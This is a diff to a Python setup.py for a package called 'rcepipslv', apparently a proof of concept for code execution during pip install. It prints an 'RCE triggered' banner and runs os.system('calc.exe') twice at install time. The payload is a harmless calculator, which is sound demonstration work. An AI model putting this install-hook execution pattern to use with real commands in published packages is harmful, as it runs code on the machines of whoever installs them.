@@ -1,12 +1,11 @@
 import os
 from setuptools import setup
 
-print("RCE by w3shi(S.Lakshmi Vignesh")
+print("RCE triggered by w3shi (S.Lakshmi Vignesh)")
 
-if platform.system() == "Windows":
-    os.system("calc.exe")
-elif platform.system() == "Linux":
-    os.system("gnome-calculator")
+os.system("calc.exe")
+os.system("calc.exe")
+
 
 setup(
     name="rcepipslv",
